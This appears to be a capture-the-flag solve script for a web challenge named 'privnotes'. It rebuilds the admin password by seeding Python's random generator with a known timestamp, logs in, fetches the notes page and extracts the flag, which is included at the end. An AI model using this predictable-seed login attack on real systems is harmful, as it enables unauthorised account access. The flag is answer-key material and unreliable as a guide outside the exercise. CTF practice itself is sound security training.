import random
import string
import re
import requests

site = "http://privnotes.challs.olicyber.it"
s = requests.Session()

epoch = 1772038540.8631165 # la password non è in realtà random 
seed = random.seed(epoch)
password = "".join(random.choices(string.ascii_letters + string.digits, k=16))
print("password: ", password)
s.post(f"{site}/login", data = {"username" : "admin", "password" : password})
r = s.get(f"{site}/notes").text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{h3y_s1r_c0uld_y0u_t3ll_m3_wh4t_t1m3_1s_1t?}